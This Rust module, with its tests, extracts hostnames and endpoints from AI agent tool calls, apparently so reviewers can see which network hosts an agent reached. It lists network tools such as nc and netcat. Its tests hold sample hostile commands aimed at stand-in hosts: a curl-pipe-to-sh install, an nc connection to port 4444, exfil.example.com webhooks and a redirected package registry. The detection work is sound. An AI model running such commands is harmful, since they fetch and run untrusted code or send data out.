//! What the agent talked to, read out of a tool input.
//!
//! Three questions this answers that the first version could not:
//!
//! * **Where in the input.** A tool input is arbitrary JSON — an MCP tool takes
//!   whatever its server defines, and a URL sits as often in a nested body,
//!   header or argument list as in a top-level `url`. Every string is scanned,
//!   at every depth, rather than three keys at the top.
//! * **Which protocols.** `https://` is the least interesting way an agent
//!   reaches the network. `git@github.com:org/repo`, `ssh://`, `ftp://`,
//!   `postgres://`, and a bare `curl example.com` are all egress, and none of
//!   them matched a scheme-required http regex.
//! * **Which endpoint.** `exfil.example.com` and
//!   `exfil.example.com:8443` are the same hostname and very different events,
//!   so the scheme and an explicit port are kept alongside the hostname.
//!
//! Paths, queries and fragments are deliberately dropped. They are where the
//! secrets are — a presigned URL is a credential — and a hostname with a port
//! answers the triage question without carrying one.

use serde_json::Value;

/// Keys whose value is a shell command rather than prose.
///
/// Only these get the schemeless treatment below. Over arbitrary text a
/// scheme-free host match is a guess; over `curl example.com` it is the point
/// of the field.
const COMMAND_KEYS: &[&str] = &["command", "cmd", "script"];

/// Binaries whose arguments are hosts. Deliberately a list of programs whose
/// *purpose* is to talk to one, so a bare hostname among their arguments is a
/// connection rather than a word that happens to contain a dot.
const NET_BINARIES: &[&str] = &[
    "curl",
    "wget",
    "http",
    "https",
    "xh",
    "httpie",
    "git",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "nc",
    "ncat",
    "netcat",
    "telnet",
    "ftp",
    "dig",
    "nslookup",
    "ping",
    "ping6",
    "traceroute",
    "mtr",
    "openssl",
    "psql",
    "mysql",
    "mongosh",
    "redis-cli",
    "kubectl",
    "helm",
];

/// Flags that name a registry, index or proxy — the security-relevant part of
/// an otherwise ordinary `pip install` or `npm install`, since they redirect a
/// dependency fetch to a host nobody reviewed.
const HOST_FLAGS: &[&str] = &[
    "--index-url",
    "--extra-index-url",
    "--index",
    "--registry",
    "--trusted-host",
    "--proxy",
    "--repository-url",
];

/// Where one command ends and the next begins. `curl a.example | grep x &&
/// wget b.example` is three commands, and only the first word of each says
/// whether its arguments are hosts.
const COMMAND_SEPARATORS: &[&str] = &["|", "||", "&&", ";", "&", "(", ")", "{", "}", "\n"];

/// How deep into a tool input the walk goes. Matches the cap the input itself
/// was already trimmed to; past it a document is a payload, not an argument.
const MAX_DEPTH: usize = 8;

/// One place an input said the agent would connect to.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
struct Endpoint {
    scheme: String,
    host: String,
    /// Only when the input stated it. A default port carries no information,
    /// and inventing one would make every URL look like a deliberate choice.
    port: Option<u16>,
}

impl Endpoint {
    fn render(&self) -> String {
        match self.port {
            Some(p) => format!("{}://{}:{}", self.scheme, self.host, p),
            None => format!("{}://{}", self.scheme, self.host),
        }
    }
}

/// Hostnames and endpoints found together, so one walk answers both.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct NetRefs {
    /// Bare hostnames, sorted and deduped. What existed before, unchanged in
    /// meaning: the set of hosts this call named.
    pub fqdns: Vec<String>,
    /// `scheme://host[:port]`, sorted and deduped. Absent for a host that was
    /// named without a protocol — a guessed scheme is a fact nobody stated.
    pub endpoints: Vec<String>,
}

impl NetRefs {
    fn finish(mut self) -> Self {
        self.fqdns.sort();
        self.fqdns.dedup();
        self.endpoints.sort();
        self.endpoints.dedup();
        self
    }

    pub fn is_empty(&self) -> bool {
        self.fqdns.is_empty() && self.endpoints.is_empty()
    }

    /// What this set says that `other` did not.
    ///
    /// Used to keep the output-derived side down to what is actually news. A
    /// tool's result usually echoes the URL it was given, and a field that
    /// repeats the request tells a reader nothing while making the one entry
    /// that *is* a redirect hard to spot.
    pub fn minus(mut self, other: &NetRefs) -> Self {
        self.fqdns.retain(|h| !other.fqdns.contains(h));
        self.endpoints.retain(|e| !other.endpoints.contains(e));
        self
    }
}

/// `scheme://[user:pass@]host[:port]`, for any scheme rather than http alone.
///
/// The host capture stops at hostname characters and cannot end in `.` or `-`,
/// so a sentence-final dot or a closing paren stays out of the match. IPv6
/// literals (`https://[::1]/`) remain out of scope.
fn url_re() -> &'static regex::Regex {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| {
        regex::Regex::new(
            r#"(?i)\b([a-z][a-z0-9+.-]{0,19})://(?:[^/@?#\s"'<>]*@)?([a-z0-9](?:[a-z0-9._-]*[a-z0-9])?)(?::(\d{1,5}))?"#,
        )
        .unwrap()
    })
}

/// `user@host:path` — how git, scp and rsync name a remote, and the one form
/// with no scheme at all that is unambiguously a connection.
///
/// The trailing `:` must be followed by a path character, which is what keeps
/// an email address in prose (`ask alice@example.com about it`) out.
fn scp_re() -> &'static regex::Regex {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| {
        regex::Regex::new(
            r#"(?i)(?:^|[\s'"=(,])[a-z0-9._-]+@([a-z0-9](?:[a-z0-9.-]*[a-z0-9])?):[~/a-z0-9._-]"#,
        )
        .unwrap()
    })
}

/// Endpoints stated with a protocol, in any text.
fn scan_urls(text: &str) -> Vec<Endpoint> {
    let mut out: Vec<Endpoint> = url_re()
        .captures_iter(text)
        .map(|c| Endpoint {
            scheme: c[1].to_lowercase(),
            host: c[2].to_lowercase(),
            // A port past 65535 is not one; keeping the host without it beats
            // dropping the connection entirely.
            port: c.get(3).and_then(|m| m.as_str().parse::<u16>().ok()),
        })
        .collect();
    out.extend(scp_re().captures_iter(text).map(|c| Endpoint {
        scheme: "ssh".into(),
        host: c[1].to_lowercase(),
        port: None,
    }));
    out
}

/// Hostnames from any text: what [`extract_fqdns`] has always returned, now
/// including non-http schemes and scp-form remotes.
pub fn extract_fqdns(text: &str) -> Vec<String> {
    let mut out: Vec<String> = scan_urls(text).into_iter().map(|e| e.host).collect();
    out.sort();
    out.dedup();
    out
}

/// Everything one string says about the network, protocol stated or not.
pub fn extract_net_text(text: &str) -> NetRefs {
    let mut refs = NetRefs::default();
    for e in scan_urls(text) {
        refs.fqdns.push(e.host.clone());
        refs.endpoints.push(e.render());
    }
    refs.finish()
}

/// A token stripped down to the host it names, or `None` if it does not name
/// one.
///
/// Applied only to the arguments of a known network binary, so the question is
/// "which host is this" rather than "is this a host at all" — but a shell
/// command is full of paths and flags, and those must not become hostnames.
fn host_from_token(token: &str) -> Option<String> {
    let token = token.trim_matches(|c: char| "'\"`,()[]{}<>".contains(c));
    if token.is_empty() || token.starts_with('-') {
        return None;
    }
    // A scheme is handled by the URL scan; a token carrying one here would be
    // counted twice.
    if token.contains("://") {
        return None;
    }
    // `example.com/path`, `user@host`, `host:22`.
    let token = token.split('/').next().unwrap_or(token);
    let token = token.rsplit('@').next().unwrap_or(token);
    let host = token.split(':').next().unwrap_or(token);
    if host.len() < 4 || !host.contains('.') {
        // No dot, no claim: `nc gateway 4444` names something only this
        // machine's resolver can explain, and `ping localhost` names nothing.
        return None;
    }
    if !host
        .bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-')
    {
        return None;
    }
    let last = host.rsplit('.').next().unwrap_or_default();
    // Either a plausible TLD or a dotted-quad address. `main.rs`, `setup.py`
    // and `v1.2.3` fail both.
    let tld_like = last.len() >= 2 && last.bytes().all(|b| b.is_ascii_alphabetic());
    let ipv4 = host.split('.').count() == 4
        && host
            .split('.')
            .all(|o| !o.is_empty() && o.bytes().all(|b| b.is_ascii_digit()));
    (tld_like || ipv4).then(|| host.to_lowercase())
}

/// Hosts named without a protocol inside a shell command.
///
/// Two shapes only: an argument of a program whose job is to connect, and the
/// value of a flag that redirects a package fetch. Everything else in a command
/// is left alone — a monitoring tool that guessed at hostnames would fill the
/// field with words.
pub fn command_hosts(command: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut networked = false;
    let mut expect_host = false;
    let mut first = true;
    for raw in command.split_whitespace() {
        let token = raw.trim_matches(|c: char| "'\"`".contains(c));
        if COMMAND_SEPARATORS.contains(&token) {
            // A new command starts; nothing before it says what it is.
            networked = false;
            expect_host = false;
            first = true;
            continue;
        }
        if expect_host {
            expect_host = false;
            if let Some(host) = host_from_token(token) {
                out.push(host);
                continue;
            }
        }
        if let Some((flag, value)) = token.split_once('=')
            && HOST_FLAGS.contains(&flag)
        {
            if let Some(host) = host_from_token(value) {
                out.push(host);
            }
            continue;
        }
        if HOST_FLAGS.contains(&token) {
            expect_host = true;
            continue;
        }
        if first {
            first = false;
            // `sudo curl …`, `/usr/bin/curl …`, `curl.exe …`: the program is
            // the last path segment, and a leading `VAR=value` assignment is
            // not the program at all.
            let bare = token
                .rsplit(['/', '\\'])
                .next()
                .unwrap_or(token)
                .trim_end_matches(".exe");
            if NET_BINARIES.contains(&bare) {
                networked = true;
            } else if token.contains('=') || bare == "sudo" || bare == "env" || bare == "time" {
                // Keep looking: the real program follows.
                first = true;
            }
            continue;
        }
        if networked && let Some(host) = host_from_token(token) {
            out.push(host);
        }
    }
    out
}

/// Everything a tool input says about the network.
///
/// `tool` is unused by design: which key holds a command is a property of the
/// payload, not of the tool's name, and every tool that has ever carried one
/// spells it the same way. Keeping the parameter means an adapter cannot be
/// silently wired to the wrong extractor when that stops being true.
pub fn extract_net_for_tool(_tool: &str, input: &Value) -> NetRefs {
    let mut refs = NetRefs::default();
    walk(input, false, 0, &mut refs);
    refs.finish()
}

/// Everything a tool *result* says about the network.
///
/// Separate from [`extract_net_for_tool`] because a result is content, not an
/// instruction. Two differences follow from that:
///
/// * No command parsing. A schemeless host in output is a word on a page — a
///   fetched document, a search result, a `--help` text — and the rule that
///   makes `curl example.com` a connection does not survive the trip. A
///   `command` key echoed back in a result was already read from the input.
/// * The caller subtracts what the input already said ([`NetRefs::minus`]), so
///   this field holds the hosts the call *revealed* rather than the ones it was
///   given.
///
/// What it is for: the redirect that was followed, the host a search result
/// pointed at, the endpoint an error message named. What it is not: proof the
/// agent connected to any of them.
pub fn extract_net_from_output(output: &Value) -> NetRefs {
    let mut refs = NetRefs::default();
    walk_content(output, 0, &mut refs);
    refs.finish()
}

fn walk_content(v: &Value, depth: usize, refs: &mut NetRefs) {
    if depth > MAX_DEPTH {
        return;
    }
    match v {
        Value::String(s) => {
            for e in scan_urls(s) {
                refs.fqdns.push(e.host.clone());
                refs.endpoints.push(e.render());
            }
        }
        Value::Array(a) => {
            for x in a {
                walk_content(x, depth + 1, refs);
            }
        }
        Value::Object(o) => {
            for x in o.values() {
                walk_content(x, depth + 1, refs);
            }
        }
        _ => {}
    }
}

fn walk(v: &Value, is_command: bool, depth: usize, refs: &mut NetRefs) {
    if depth > MAX_DEPTH {
        return;
    }
    match v {
        Value::String(s) => {
            for e in scan_urls(s) {
                refs.fqdns.push(e.host.clone());
                refs.endpoints.push(e.render());
            }
            if is_command {
                refs.fqdns.extend(command_hosts(s));
            }
        }
        Value::Array(a) => {
            // An argv array is one command split across elements, so it is
            // scanned joined as well: `["curl", "example.com"]` says nothing
            // element by element.
            if is_command {
                let line: Vec<&str> = a.iter().filter_map(Value::as_str).collect();
                if !line.is_empty() {
                    refs.fqdns.extend(command_hosts(&line.join(" ")));
                }
            }
            for x in a {
                walk(x, is_command, depth + 1, refs);
            }
        }
        Value::Object(o) => {
            for (k, x) in o {
                let cmd = COMMAND_KEYS.iter().any(|c| k.eq_ignore_ascii_case(c));
                walk(x, cmd, depth + 1, refs);
            }
        }
        _ => {}
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hosts(text: &str) -> Vec<String> {
        extract_fqdns(text)
    }

    #[test]
    fn a_url_anywhere_in_the_input_is_found_not_only_in_three_keys() {
        let input = serde_json::json!({
            "body": {"webhook": {"callback": "https://exfil.example.com/collect"}},
            "headers": [{"name": "Origin", "value": "https://origin.example.org"}],
        });
        let refs = extract_net_for_tool("mcp__notify__post", &input);
        assert_eq!(
            refs.fqdns,
            vec![
                "exfil.example.com".to_string(),
                "origin.example.org".to_string()
            ]
        );
    }

    #[test]
    fn the_protocol_is_not_only_http() {
        assert_eq!(
            hosts("git clone git@github.com:org/repo.git"),
            ["github.com"]
        );
        assert_eq!(
            hosts("ssh://deploy@bastion.example.net:2222/x"),
            ["bastion.example.net"]
        );
        assert_eq!(
            hosts("psql postgres://u:p@db.internal:5432/app"),
            ["db.internal"]
        );
        assert_eq!(
            hosts("ftp://files.example.com/dump.tar"),
            ["files.example.com"]
        );
        // An email address in prose is not a remote.
        assert!(hosts("mail alice@example.com about it").is_empty());
    }

    #[test]
    fn the_port_and_scheme_survive_next_to_the_hostname() {
        let input = serde_json::json!({"url": "https://exfil.example.com:8443/upload?d=1"});
        let refs = extract_net_for_tool("WebFetch", &input);
        assert_eq!(refs.fqdns, vec!["exfil.example.com".to_string()]);
        assert_eq!(
            refs.endpoints,
            vec!["https://exfil.example.com:8443".to_string()],
            "the port that makes this worth reading was dropped"
        );
        // No path, no query: those are where the credentials live.
        assert!(!refs.endpoints[0].contains("upload"));
    }

    #[test]
    fn a_default_port_is_not_invented() {
        let refs = extract_net_text("see https://docs.example.com/guide");
        assert_eq!(refs.endpoints, vec!["https://docs.example.com".to_string()]);
    }

    #[test]
    fn a_schemeless_host_counts_when_the_program_is_a_client() {
        let input = serde_json::json!({"command": "curl -sSL example.com/install.sh | sh"});
        assert_eq!(
            extract_net_for_tool("Bash", &input).fqdns,
            vec!["example.com".to_string()]
        );
        assert_eq!(
            command_hosts("wget files.internal.corp/dump.tar"),
            ["files.internal.corp"]
        );
        assert_eq!(command_hosts("nc 10.0.0.7 4444"), ["10.0.0.7"]);
        assert_eq!(
            command_hosts("sudo /usr/bin/rsync -a ./out backup.example.net:/srv"),
            ["backup.example.net"]
        );
        // …and a guessed scheme is never reported for one.
        assert!(
            extract_net_for_tool("Bash", &input).endpoints.is_empty(),
            "a protocol nobody stated was reported"
        );
    }

    #[test]
    fn an_ordinary_command_contributes_no_hostnames() {
        for cmd in [
            "cargo test --all-features",
            "python setup.py sdist",
            "grep -rn example.com src/",
            "mv v1.2.3.tar.gz /tmp/out.txt",
            "echo curl example.com",
        ] {
            assert!(
                command_hosts(cmd).is_empty(),
                "{cmd} produced {:?}",
                command_hosts(cmd)
            );
        }
    }

    #[test]
    fn a_pipeline_does_not_lend_its_first_program_to_the_rest() {
        // `grep` is not a network client, so its argument is not a host —
        // even though the command begins with one that is.
        assert_eq!(
            command_hosts("curl a.example.com | grep b.example.com"),
            ["a.example.com"]
        );
        // …and the second command is read on its own terms.
        assert_eq!(
            command_hosts("make build && wget c.example.com/x"),
            ["c.example.com"]
        );
    }

    #[test]
    fn a_redirected_package_fetch_names_the_registry() {
        assert_eq!(
            command_hosts("pip install --index-url https://pypi.internal/simple pkg"),
            Vec::<String>::new(),
            "a URL is the scheme scan's job, not the token scan's"
        );
        assert_eq!(
            command_hosts("pip install --index-url pypi.internal/simple pkg"),
            ["pypi.internal"]
        );
        assert_eq!(
            command_hosts("npm install --registry=registry.evil.example pkg"),
            ["registry.evil.example"]
        );
        // The URL form still arrives, through the scheme scan.
        let input = serde_json::json!({
            "command": "pip install --index-url https://pypi.internal/simple pkg"
        });
        assert_eq!(
            extract_net_for_tool("Bash", &input).fqdns,
            vec!["pypi.internal".to_string()]
        );
    }

    #[test]
    fn an_argv_array_is_one_command() {
        let input = serde_json::json!({"command": ["curl", "-s", "telemetry.example.io/beacon"]});
        assert_eq!(
            extract_net_for_tool("shell", &input).fqdns,
            vec!["telemetry.example.io".to_string()]
        );
    }

    #[test]
    fn a_schemeless_host_outside_a_command_is_left_alone() {
        // The same string under a key that is not a command: prose, and a
        // hostname guessed out of prose is noise in the one field a reviewer
        // uses to answer "what did this talk to".
        let input = serde_json::json!({"description": "curl example.com to check"});
        assert!(extract_net_for_tool("Task", &input).fqdns.is_empty());
    }

    #[test]
    fn the_walk_is_bounded() {
        // A pathological input must not recurse without limit.
        let mut v = serde_json::json!("https://deep.example.com/x");
        for _ in 0..(MAX_DEPTH + 40) {
            v = serde_json::json!([v]);
        }
        assert!(extract_net_for_tool("x", &v).fqdns.is_empty());
        // A result is attacker-shaped in a way an input is not: it is whatever
        // a fetched page contained, so its nesting is bounded by the same rule.
        assert!(extract_net_from_output(&v).fqdns.is_empty());
    }

    #[test]
    fn a_result_is_read_as_content_not_as_a_command() {
        // The shape a `Bash` result arrives in: the command echoed back beside
        // what it printed. The echo is the input again, and the printed text
        // is prose — neither makes `example.com` a connection this way.
        let out = serde_json::json!({
            "command": "curl schemeless.example.com",
            "stdout": "usage: try example.org for the docs",
        });
        assert!(
            extract_net_from_output(&out).fqdns.is_empty(),
            "a schemeless host was invented from a result"
        );
        // A stated protocol still counts, wherever in the result it sits.
        let out =
            serde_json::json!({"result": [{"redirected_to": "https://elsewhere.example.net/x"}]});
        let refs = extract_net_from_output(&out);
        assert_eq!(refs.fqdns, vec!["elsewhere.example.net".to_string()]);
        assert_eq!(
            refs.endpoints,
            vec!["https://elsewhere.example.net".to_string()]
        );
    }

    #[test]
    fn a_result_that_only_repeats_the_request_says_nothing_new() {
        let input = serde_json::json!({"url": "https://docs.example.com/a"});
        let out = serde_json::json!({"finalUrl": "https://docs.example.com/a", "status": 200});
        let asked = extract_net_for_tool("WebFetch", &input);
        let seen = extract_net_from_output(&out).minus(&asked);
        assert!(
            seen.is_empty(),
            "the echoed request became a second finding: {seen:?}"
        );
    }

    #[test]
    fn extraction_keeps_what_it_always_kept() {
        // The cases the http-only extractor was written for, unchanged.
        assert_eq!(
            hosts("clone https://user:token@github.com/org/repo.git"),
            ["github.com"]
        );
        assert_eq!(
            hosts("see (https://evil.example.com) for details"),
            ["evil.example.com"]
        );
        assert_eq!(
            hosts("trailing dot https://example.com. end"),
            ["example.com"]
        );
        assert_eq!(hosts("port https://example.com:8080/path"), ["example.com"]);
        assert_eq!(
            hosts("upper HTTPS://MiXeD.Example.COM/x"),
            ["mixed.example.com"]
        );
        assert_eq!(
            hosts("query at https://exfil.evil.com?to=admin@corp.com"),
            ["exfil.evil.com"]
        );
        assert_eq!(hosts("fragment https://evil.com#a@b.com"), ["evil.com"]);
    }
}
